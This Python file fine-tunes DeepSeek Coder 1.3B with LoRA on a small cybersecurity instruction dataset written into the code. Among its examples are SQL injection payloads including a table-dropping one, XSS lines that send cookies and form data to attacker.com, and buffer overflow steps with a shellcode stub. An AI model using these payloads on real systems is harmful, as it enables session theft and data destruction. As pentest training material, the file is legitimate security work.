#!/usr/bin/env python3
"""
DeepSeek Coder 1.3B Fine-tuning Module
Prepares cybersecurity-specific datasets and performs LoRA fine-tuning
Memory-optimized for local training environments
"""

import json
import os
import sys
from pathlib import Path
from typing import Dict, Any, List, Tuple, Optional
import torch
from transformers import (
    AutoTokenizer, 
    AutoModelForCausalLM, 
    TrainingArguments,
    Trainer,
    DataCollatorForLanguageModeling,
    pipeline
)
from datasets import Dataset
from peft import LoraConfig, get_peft_model, TaskType, PeftModel
import yaml
from loguru import logger
import pandas as pd
from datetime import datetime
import psutil
import random
import re

from shared_utils import ConfigManager, LoggerManager, DirectoryManager

class DeepSeekFineTuner:
    """Fine-tuning manager for DeepSeek Coder 1.3B with LoRA"""
    
    def __init__(self, config: Dict[str, Any] = None):
        self.config = config or ConfigManager.get_instance().config
        self.logger = LoggerManager.setup_logger('deepseek_finetune')
        
        # Model configuration
        self.model_name = "deepseek-ai/deepseek-coder-1.3b-instruct"
        self.device = "cuda" if torch.cuda.is_available() else "cpu"
        self.max_length = 512  # Memory optimization
        
        # LoRA configuration
        self.lora_config = LoraConfig(
            task_type=TaskType.CAUSAL_LM,
            inference_mode=False,
            r=16,
            lora_alpha=32,
            lora_dropout=0.1,
            target_modules=["q_proj", "v_proj", "k_proj", "o_proj", "gate_proj", "up_proj", "down_proj"],
            bias="none"
        )
        
        # Setup directories
        DirectoryManager.ensure_directory("models/deepseek")
        DirectoryManager.ensure_directory("data/finetune")
        DirectoryManager.ensure_directory("data/finetune/processed")
        
        self.base_dir = Path("models/deepseek")
        self.data_dir = Path("data/finetune")
        
        self.logger.info("🔧 DeepSeek Fine-tuner initialized")

    async def prepare_cybersecurity_dataset(self) -> str:
        """Prepare cybersecurity-specific training dataset"""
        self.logger.info("🗂️ Preparing cybersecurity training dataset...")
        
        try:
            # Collect cybersecurity data
            training_data = []
            
            # Add penetration testing examples
            training_data.extend(self._get_pentesting_examples())
            
            # Add vulnerability analysis examples
            training_data.extend(self._get_vulnerability_examples())
            
            # Add security code generation examples
            training_data.extend(self._get_code_generation_examples())
            
            # Add threat intelligence examples
            training_data.extend(self._get_threat_intel_examples())
            
            # Process existing data sources
            await self._process_existing_logs(training_data)
            
            # Format for training
            formatted_data = self._format_for_training(training_data)
            
            # Save to file
            dataset_file = self.data_dir / "processed" / f"cybersec_dataset_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jsonl"
            
            with open(dataset_file, 'w', encoding='utf-8') as f:
                for item in formatted_data:
                    f.write(json.dumps(item, ensure_ascii=False) + '\n')
            
            self.logger.info(f"✅ Dataset prepared: {len(formatted_data)} samples saved to {dataset_file}")
            return str(dataset_file)
            
        except Exception as e:
            self.logger.error(f"❌ Dataset preparation failed: {e}")
            raise

    def _get_pentesting_examples(self) -> List[Dict[str, str]]:
        """Generate penetration testing training examples"""
        return [
            {
                "instruction": "Generate an Nmap scan command to discover web services on a target",
                "input": "Target: 192.168.1.100, Focus: Web services",
                "output": "nmap -sS -sV -p 80,443,8080,8443,8000,8888 --script http-enum,http-title 192.168.1.100"
            },
            {
                "instruction": "Create a Python script to test for SQL injection vulnerability",
                "input": "URL: http://example.com/login.php, Parameter: username",
                "output": """import requests
import urllib.parse

def test_sql_injection(url, param):
    payloads = ["'", "1' OR '1'='1", "'; DROP TABLE users--", "1' UNION SELECT null,user(),version()--"]
    
    for payload in payloads:
        data = {param: payload}
        try:
            response = requests.post(url, data=data, timeout=10)
            if "error" in response.text.lower() or "sql" in response.text.lower():
                print(f"Potential SQL injection with payload: {payload}")
                return True
        except requests.RequestException as e:
            print(f"Request failed: {e}")
    
    return False

# Test the function
test_sql_injection("http://example.com/login.php", "username")"""
            },
            {
                "instruction": "Analyze Nmap scan results and identify potential vulnerabilities",
                "input": "Nmap output shows port 21 (FTP), 22 (SSH), 80 (HTTP), 443 (HTTPS) open",
                "output": """Analysis of open ports:

1. Port 21 (FTP):
   - Check for anonymous access: ftp anonymous@target
   - Test for default credentials
   - Look for FTP bounce attacks
   
2. Port 22 (SSH):
   - Enumerate SSH version for known vulnerabilities
   - Test for weak authentication (brute force)
   - Check for SSH key-based attacks
   
3. Port 80 (HTTP):
   - Directory enumeration: gobuster dir -u http://target -w /path/to/wordlist
   - Check for common vulnerabilities (XSS, SQLi, LFI)
   - Analyze HTTP headers and server information
   
4. Port 443 (HTTPS):
   - SSL/TLS configuration analysis: sslscan target:443
   - Certificate enumeration
   - Check for HTTPS-specific vulnerabilities

Recommended next steps:
1. Service version enumeration: nmap -sV -p 21,22,80,443 target
2. Vulnerability scanning: nmap --script vuln target
3. Web application testing using tools like Burp Suite or OWASP ZAP"""
            },
            {
                "instruction": "Generate a Python script for subdomain enumeration",
                "input": "Target domain: example.com",
                "output": """import requests
import sys
import threading
from queue import Queue

def check_subdomain(subdomain, domain, results):
    url = f"http://{subdomain}.{domain}"
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            results.append(f"{subdomain}.{domain}")
            print(f"[+] Found: {subdomain}.{domain}")
    except requests.RequestException:
        pass

def subdomain_enum(domain, wordlist_file, threads=50):
    with open(wordlist_file, 'r') as f:
        subdomains = [line.strip() for line in f.readlines()]
    
    results = []
    q = Queue()
    
    # Add subdomains to queue
    for subdomain in subdomains:
        q.put(subdomain)
    
    # Worker function
    def worker():
        while not q.empty():
            subdomain = q.get()
            check_subdomain(subdomain, domain, results)
            q.task_done()
    
    # Start threads
    for _ in range(threads):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
    
    q.join()
    return results

# Usage
if __name__ == "__main__":
    domain = "example.com"
    wordlist = "subdomains.txt"  # Common subdomain wordlist
    found_subdomains = subdomain_enum(domain, wordlist)
    print(f"\\nTotal subdomains found: {len(found_subdomains)}")"""
            }
        ]

    def _get_vulnerability_examples(self) -> List[Dict[str, str]]:
        """Generate vulnerability analysis training examples"""
        return [
            {
                "instruction": "Explain the impact and exploitation of a Cross-Site Scripting (XSS) vulnerability",
                "input": "Vulnerability: Reflected XSS in search parameter",
                "output": """Cross-Site Scripting (XSS) Vulnerability Analysis:

**Type**: Reflected XSS
**Location**: Search parameter
**Severity**: Medium to High

**Impact**:
1. Session hijacking through cookie theft
2. Credential harvesting via fake login forms
3. Malware distribution through malicious redirects
4. Phishing attacks and social engineering
5. Administrative action execution if admin is victim

**Exploitation**:
1. Basic payload: <script>alert('XSS')</script>
2. Cookie theft: <script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
3. Form hijacking: <script>document.forms[0].action='http://attacker.com/harvest.php'</script>

**Remediation**:
1. Input validation and sanitization
2. Output encoding (HTML entity encoding)
3. Content Security Policy (CSP) implementation
4. Use of secure frameworks that auto-escape output
5. Regular security testing and code review

**Detection Commands**:
- Manual testing with payloads
- Automated scanning with tools like XSStrike
- Browser developer tools for DOM analysis"""
            },
            {
                "instruction": "Analyze a buffer overflow vulnerability and provide exploitation steps",
                "input": "Buffer overflow in strcpy() function with 256-byte buffer",
                "output": """Buffer Overflow Vulnerability Analysis:

**Vulnerability**: Stack-based buffer overflow in strcpy()
**Buffer Size**: 256 bytes
**Severity**: Critical

**Technical Details**:
- strcpy() doesn't perform bounds checking
- Attacker can overwrite return address
- Potential for arbitrary code execution

**Exploitation Process**:

1. **Identify Offset**:
   ```bash
   # Generate pattern
   msf-pattern_create -l 300
   
   # Find offset
   msf-pattern_offset -l 300 -q [crash_value]
   ```

2. **Control EIP**:
   ```python
   buffer = "A" * 256  # Fill buffer
   buffer += "B" * 4   # Overwrite saved EBP
   buffer += "CCCC"    # Control EIP
   ```

3. **Find Bad Characters**:
   ```python
   badchars = "\\x01\\x02\\x03...\\xff"
   # Test each character for filtering
   ```

4. **Find Return Address**:
   ```bash
   # Find JMP ESP instruction
   msf-nasm_shell
   nasm > jmp esp
   ```

5. **Shellcode Injection**:
   ```python
   shellcode = "\\x31\\xc0\\x50\\x68..." # msfvenom payload
   nop_sled = "\\x90" * 16
   
   exploit = buffer + eip + nop_sled + shellcode
   ```

**Mitigation**:
- Use safe functions (strncpy, strlcpy)
- Enable stack canaries (GS)
- Implement ASLR and DEP/NX bit
- Code review and static analysis"""
            }
        ]

    def _get_code_generation_examples(self) -> List[Dict[str, str]]:
        """Generate security code generation examples"""
        return [
            {
                "instruction": "Create a secure password validation function in Python",
                "input": "Requirements: minimum 8 characters, uppercase, lowercase, digit, special character",
                "output": """import re
import string

def validate_password(password):
    \"\"\"
    Validate password strength based on security requirements
    
    Args:
        password (str): Password to validate
        
    Returns:
        tuple: (is_valid, error_messages)
    \"\"\"
    errors = []
    
    # Check minimum length
    if len(password) < 8:
        errors.append("Password must be at least 8 characters long")
    
    # Check for uppercase letter
    if not re.search(r'[A-Z]', password):
        errors.append("Password must contain at least one uppercase letter")
    
    # Check for lowercase letter
    if not re.search(r'[a-z]', password):
        errors.append("Password must contain at least one lowercase letter")
    
    # Check for digit
    if not re.search(r'\\d', password):
        errors.append("Password must contain at least one digit")
    
    # Check for special character
    special_chars = "!@#$%^&*()_+-=[]{}|;:,.<>?"
    if not any(char in special_chars for char in password):
        errors.append("Password must contain at least one special character")
    
    # Check for common weak passwords
    common_passwords = ["password", "123456", "qwerty", "admin"]
    if password.lower() in common_passwords:
        errors.append("Password is too common")
    
    return len(errors) == 0, errors

# Example usage
password = "SecurePass123!"
is_valid, errors = validate_password(password)

if is_valid:
    print("Password is valid")
else:
    print("Password validation failed:")
    for error in errors:
        print(f"- {error}")"""
            },
            {
                "instruction": "Write a function to safely execute system commands to prevent command injection",
                "input": "Need to ping an IP address with user input validation",
                "output": """import subprocess
import re
import shlex

def safe_ping(ip_address, count=4):
    \"\"\"
    Safely ping an IP address with input validation
    
    Args:
        ip_address (str): IP address to ping
        count (int): Number of ping packets
        
    Returns:
        dict: Ping results or error information
    \"\"\"
    
    # Validate IP address format
    ip_pattern = r'^\\b(?:[0-9]{1,3}\\.){3}[0-9]{1,3}\\b$'
    if not re.match(ip_pattern, ip_address):
        return {"error": "Invalid IP address format"}
    
    # Additional validation for private/malicious IPs
    octets = ip_address.split('.')
    try:
        octets = [int(octet) for octet in octets]
        if any(octet < 0 or octet > 255 for octet in octets):
            return {"error": "Invalid IP address range"}
    except ValueError:
        return {"error": "Invalid IP address format"}
    
    # Validate count parameter
    if not isinstance(count, int) or count < 1 or count > 10:
        return {"error": "Count must be an integer between 1 and 10"}
    
    try:
        # Use subprocess with list arguments to prevent injection
        # Never use shell=True with user input
        cmd = ["ping", "-c", str(count), ip_address]
        
        # Execute command safely
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=30,  # Prevent hanging
            check=False
        )
        
        return {
            "success": result.returncode == 0,
            "output": result.stdout,
            "error": result.stderr,
            "return_code": result.returncode
        }
        
    except subprocess.TimeoutExpired:
        return {"error": "Ping command timed out"}
    except Exception as e:
        return {"error": f"Command execution failed: {str(e)}"}

# Example usage
result = safe_ping("8.8.8.8", 3)
if result.get("success"):
    print("Ping successful:")
    print(result["output"])
else:
    print(f"Ping failed: {result.get('error', 'Unknown error')}")"""
            }
        ]

    def _get_threat_intel_examples(self) -> List[Dict[str, str]]:
        """Generate threat intelligence training examples"""
        return [
            {
                "instruction": "Analyze a suspicious file hash and provide threat intelligence",
                "input": "File hash: 5d41402abc4b2a76b9719d911017c592",
                "output": """Threat Intelligence Analysis:

**File Hash**: 5d41402abc4b2a76b9719d911017c592 (MD5)
**Analysis Date**: Current timestamp

**Hash Analysis**:
1. Check against known malware databases
2. VirusTotal submission and results
3. Hybrid Analysis sandbox execution
4. YARA rule matching

**Investigation Steps**:
```bash
# Check hash reputation
curl -X GET "https://www.virustotal.com/vtapi/v2/file/report?apikey=YOUR_API_KEY&resource=5d41402abc4b2a76b9719d911017c592"

# Generate additional hashes
sha1sum suspicious_file
sha256sum suspicious_file

# Static analysis
file suspicious_file
strings suspicious_file | grep -E "(http|ftp|exe|dll)"
hexdump -C suspicious_file | head -20
```

**Risk Assessment**:
- File reputation: Unknown/Suspicious
- Behavioral indicators: Pending analysis
- Network indicators: To be determined
- Persistence mechanisms: Under investigation

**Recommended Actions**:
1. Quarantine affected systems
2. Network traffic analysis
3. Memory dump analysis if executed
4. IOC generation for monitoring
5. Incident response team notification

**Attribution Indicators**:
- Compile timestamps
- Language artifacts
- Code structure analysis
- Infrastructure patterns"""
            }
        ]

    async def _process_existing_logs(self, training_data: List[Dict[str, str]]):
        """Process existing log files for training data"""
        log_dirs = ["data/logs", "data/rag_data", "data/reports"]
        
        for log_dir in log_dirs:
            log_path = Path(log_dir)
            if log_path.exists():
                for file_path in log_path.rglob("*.json"):
                    try:
                        with open(file_path, 'r', encoding='utf-8') as f:
                            data = json.load(f)
                            if isinstance(data, dict) and 'query' in data and 'analysis' in data:
                                training_data.append({
                                    "instruction": "Provide cybersecurity analysis for the given query",
                                    "input": data['query'],
                                    "output": data['analysis']
                                })
                    except Exception as e:
                        self.logger.warning(f"Failed to process log file {file_path}: {e}")

    def _format_for_training(self, training_data: List[Dict[str, str]]) -> List[Dict[str, str]]:
        """Format data for DeepSeek training"""
        formatted_data = []
        
        for item in training_data:
            # DeepSeek Coder instruction format
            if 'input' in item and item['input']:
                text = f"### Instruction:\n{item['instruction']}\n\n### Input:\n{item['input']}\n\n### Response:\n{item['output']}"
            else:
                text = f"### Instruction:\n{item['instruction']}\n\n### Response:\n{item['output']}"
            
            formatted_data.append({
                "text": text,
                "prompt": f"### Instruction:\n{item['instruction']}\n\n### Input:\n{item.get('input', '')}\n\n### Response:\n" if item.get('input') else f"### Instruction:\n{item['instruction']}\n\n### Response:\n",
                "completion": item['output']
            })
        
        return formatted_data

    async def fine_tune_model(self, dataset_file: str, output_dir: str = None) -> str:
        """Fine-tune DeepSeek Coder with LoRA"""
        if output_dir is None:
            output_dir = str(self.base_dir / f"finetune_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
        
        self.logger.info(f"🚀 Starting fine-tuning process...")
        self.logger.info(f"📊 Dataset: {dataset_file}")
        self.logger.info(f"💾 Output: {output_dir}")
        
        try:
            # Load tokenizer and model
            self.logger.info("📚 Loading tokenizer...")
            tokenizer = AutoTokenizer.from_pretrained(
                self.model_name,
                trust_remote_code=True,
                cache_dir=str(self.base_dir)
            )
            
            if tokenizer.pad_token is None:
                tokenizer.pad_token = tokenizer.eos_token
            
            self.logger.info("🧠 Loading base model...")
            model = AutoModelForCausalLM.from_pretrained(
                self.model_name,
                torch_dtype=torch.float16 if torch.cuda.is_available() else torch.float32,
                device_map="auto" if torch.cuda.is_available() else None,
                trust_remote_code=True,
                cache_dir=str(self.base_dir)
            )
            
            # Apply LoRA
            self.logger.info("🔧 Applying LoRA configuration...")
            model = get_peft_model(model, self.lora_config)
            model.print_trainable_parameters()
            
            # Load dataset
            self.logger.info("📖 Loading training dataset...")
            dataset = self._load_dataset(dataset_file, tokenizer)
            
            # Training arguments
            training_args = TrainingArguments(
                output_dir=output_dir,
                num_train_epochs=3,
                per_device_train_batch_size=1,  # Memory optimization
                gradient_accumulation_steps=8,
                warmup_steps=100,
                learning_rate=2e-4,
                fp16=torch.cuda.is_available(),
                logging_steps=10,
                save_steps=100,
                eval_steps=100,
                save_total_limit=3,
                remove_unused_columns=False,
                dataloader_pin_memory=False,
                report_to=None  # Disable wandb
            )
            
            # Data collator
            data_collator = DataCollatorForLanguageModeling(
                tokenizer=tokenizer,
                mlm=False,
                pad_to_multiple_of=8
            )
            
            # Trainer
            trainer = Trainer(
                model=model,
                args=training_args,
                train_dataset=dataset,
                data_collator=data_collator,
                tokenizer=tokenizer
            )
            
            # Start training
            self.logger.info("🏃 Starting training...")
            trainer.train()
            
            # Save model
            self.logger.info("💾 Saving fine-tuned model...")
            trainer.save_model()
            tokenizer.save_pretrained(output_dir)
            
            # Save LoRA config
            with open(Path(output_dir) / "lora_config.json", 'w') as f:
                json.dump(self.lora_config.to_dict(), f, indent=2)
            
            self.logger.info(f"✅ Fine-tuning complete! Model saved to: {output_dir}")
            return output_dir
            
        except Exception as e:
            self.logger.error(f"❌ Fine-tuning failed: {e}")
            raise

    def _load_dataset(self, dataset_file: str, tokenizer) -> Dataset:
        """Load and tokenize dataset"""
        with open(dataset_file, 'r', encoding='utf-8') as f:
            data = [json.loads(line) for line in f]
        
        # Tokenize data
        def tokenize_function(examples):
            # Use the 'text' field for training
            texts = [example['text'] for example in examples]
            
            # Tokenize
            tokenized = tokenizer(
                texts,
                truncation=True,
                padding='max_length',
                max_length=self.max_length,
                return_tensors="pt"
            )
            
            # For causal LM, labels are the same as input_ids
            tokenized["labels"] = tokenized["input_ids"].clone()
            
            return tokenized
        
        # Convert to dataset and tokenize
        dataset = Dataset.from_list(data)
        dataset = dataset.map(
            lambda x: tokenize_function([x]),
            batched=False,
            remove_columns=dataset.column_names
        )
        
        return dataset

    async def load_fine_tuned_model(self, model_path: str) -> pipeline:
        """Load fine-tuned model for inference"""
        self.logger.info(f"🔄 Loading fine-tuned model from: {model_path}")
        
        try:
            # Load tokenizer
            tokenizer = AutoTokenizer.from_pretrained(model_path)
            
            # Load base model
            base_model = AutoModelForCausalLM.from_pretrained(
                self.model_name,
                torch_dtype=torch.float16 if torch.cuda.is_available() else torch.float32,
                device_map="auto" if torch.cuda.is_available() else None,
                trust_remote_code=True
            )
            
            # Load LoRA adapter
            model = PeftModel.from_pretrained(base_model, model_path)
            
            # Create pipeline
            pipe = pipeline(
                "text-generation",
                model=model,
                tokenizer=tokenizer,
                device=0 if torch.cuda.is_available() else -1,
                max_length=self.max_length,
                do_sample=True,
                temperature=0.7,
                pad_token_id=tokenizer.eos_token_id
            )
            
            self.logger.info("✅ Fine-tuned model loaded successfully")
            return pipe
            
        except Exception as e:
            self.logger.error(f"❌ Failed to load fine-tuned model: {e}")
            raise

    async def test_fine_tuned_model(self, model_path: str) -> Dict[str, Any]:
        """Test the fine-tuned model with sample queries"""
        self.logger.info("🧪 Testing fine-tuned model...")
        
        try:
            pipe = await self.load_fine_tuned_model(model_path)
            
            test_queries = [
                "### Instruction:\nGenerate an Nmap command to scan for web vulnerabilities\n\n### Response:\n",
                "### Instruction:\nExplain SQL injection and provide a mitigation strategy\n\n### Response:\n",
                "### Instruction:\nCreate a Python script for port scanning\n\n### Response:\n"
            ]
            
            results = []
            
            for query in test_queries:
                self.logger.info(f"Testing query: {query[:50]}...")
                
                output = pipe(
                    query,
                    max_new_tokens=200,
                    num_return_sequences=1,
                    temperature=0.7,
                    return_full_text=False
                )
                
                response = output[0]['generated_text'].strip()
                
                results.append({
                    'query': query,
                    'response': response,
                    'length': len(response)
                })
            
            self.logger.info("✅ Model testing complete")
            return {
                'status': 'success',
                'test_results': results,
                'model_path': model_path,
                'timestamp': datetime.now().isoformat()
            }
            
        except Exception as e:
            self.logger.error(f"❌ Model testing failed: {e}")
            return {
                'status': 'failed',
                'error': str(e),
                'timestamp': datetime.now().isoformat()
            }

async def main():
    """Main fine-tuning workflow"""
    print("🔧 DeepSeek Coder 1.3B Fine-tuning Workflow")
    
    # Load config
    with open('core/config.yaml', 'r') as f:
        config = yaml.safe_load(f)
    
    # Initialize fine-tuner
    finetuner = DeepSeekFineTuner(config)
    
    try:
        # Step 1: Prepare dataset
        print("\n📊 Step 1: Preparing cybersecurity dataset...")
        dataset_file = await finetuner.prepare_cybersecurity_dataset()
        print(f"✅ Dataset prepared: {dataset_file}")
        
        # Step 2: Fine-tune model
        print("\n🚀 Step 2: Fine-tuning model...")
        model_path = await finetuner.fine_tune_model(dataset_file)
        print(f"✅ Model fine-tuned: {model_path}")
        
        # Step 3: Test model
        print("\n🧪 Step 3: Testing fine-tuned model...")
        test_results = await finetuner.test_fine_tuned_model(model_path)
        
        if test_results['status'] == 'success':
            print("✅ Fine-tuning workflow completed successfully!")
            print(f"📁 Model saved to: {model_path}")
            print(f"🧪 Test results: {len(test_results['test_results'])} queries tested")
        else:
            print(f"❌ Testing failed: {test_results['error']}")
    
    except Exception as e:
        print(f"❌ Fine-tuning workflow failed: {e}")

if __name__ == "__main__":
    import asyncio
    asyncio.run(main())
